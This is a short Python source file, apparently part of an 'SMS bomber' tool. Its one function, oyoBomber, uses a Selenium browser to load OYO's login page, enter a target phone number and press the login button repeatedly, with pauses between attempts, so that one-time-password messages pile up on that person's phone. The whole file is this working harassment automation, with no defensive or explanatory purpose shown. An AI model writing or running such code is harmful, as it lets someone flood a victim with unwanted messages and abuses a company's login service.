import time

# OYO Bomber
def oyoBomber(browser, phoneNumber, attempts=5):
    for i in range(min(attempts, 5)):
        try:
            browser.get("https://www.oyorooms.com/login?country=&retUrl=/")

            # Waiting for the page to load
            time.sleep(2)

            # Selecting the input field
            inPut = browser.find_element_by_xpath(
                "//input[@label='Enter Phone Number']"
            )
            inPut.send_keys(phoneNumber)

            # Pressing the login button
            cLick = browser.find_element_by_class_name("loginCard__button")
            cLick.click()

        except:
            print("Something went wrong in OYO Bomber")

        finally:
            # Waiting so that one request completes
            time.sleep(5)